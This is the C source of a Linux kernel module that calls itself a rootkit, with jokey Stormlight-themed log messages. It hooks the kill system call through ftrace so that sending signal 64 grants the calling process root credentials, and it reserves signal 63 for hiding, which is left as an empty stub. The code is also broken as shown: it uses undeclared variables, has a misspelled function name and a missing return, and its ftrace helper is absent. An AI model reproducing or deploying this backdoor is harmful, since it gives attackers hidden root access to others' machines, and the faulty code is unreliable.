#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
//TODO create your own ftrace helper file


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Odium");
MODULE_DESCRIPTION("Linux Kernel Rootkit Tested and Working for Kernel 5.7.x");
MODULE_VERSION("1.0");

static asmlinkage long (*original_kill) (const struct pt_regs*);

enum sigvalues {
	ELEVATE = 64,
	HIDE = 63 
};

static int invisible(void) {
	return 0;
}

static int elevate_to_root(void) {
	struct cred* current_user;

	current_user = prepare_creds();

	if (current_user == NULL) {
		return 1;
	}

	current_user->uid.val = 0;
	current_user->gid.val = 0;
	current_user->euid.val = 0;
	current_user->egid.val = 0;
	current_user->suid.val = 0;
	current_user->sgid.val = 0;
	current_user->fsuid.val = 0;
	current_user->fsgid.val = 0;

	commit_creds(current_user);
}


asmlinkage int hook_kill(void){
 	
	int signal = regs->si;

	if (signal == ELEVATE) {
		printk(KERN_INFO "Odium is giving Taravangian some voidlight and a voidspren he's too damn strong now!\n");
			
		if (elevate_to_root() == 1) {
			printk(KERN_INFO "Error: When Elevating privlieges!\n");
		}

		return 0;
	}

	else if (signal == HIDE) {
		printk(KERN_INFO "Taravangian's sneaky ass is hiding his musty ass somewhere!\n");

		if (inivisible() == 1) {
			printk(KERN_INFO "Error: When Making Invisible!\n");

		}
		return 0;
	}
		
	return original_kill(regs);
	
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &original_kill)
};

static int __init rootkit_init(void) {
	int error = 1;

	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Odium Planted that sick bastard Taravangian into your system goodluck!\n");

	return 0;
}

static void __exit rootkit_exit(void) {
	error = fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Thank God Together with the heralds and the Knigts radiant you took out Taravangian and Odium saving Roshar!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);